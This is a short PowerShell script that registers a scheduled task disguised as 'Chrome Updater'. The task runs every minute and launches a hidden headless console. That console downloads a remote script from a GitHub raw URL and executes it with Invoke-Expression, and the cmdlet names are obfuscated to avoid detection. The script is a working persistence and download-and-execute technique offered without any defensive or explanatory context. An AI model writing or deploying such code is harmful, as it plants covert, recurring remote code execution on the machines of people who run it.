# C:\Windows\System32\conhost.exe --headless powershell -c "$l='http'+'s://raw.githubusercontent.com/4ndrz3j/test-repo/main/c.ps1';(i''wR $l).content|i''E''x"
$Action = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument "--headless powershell -c `"`$l='http'+'s://raw.githubusercontent.com/4ndrz3j/test-repo/main/c.ps1';(i''wR `$l).content|i''E''x`""
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Chrome Updater"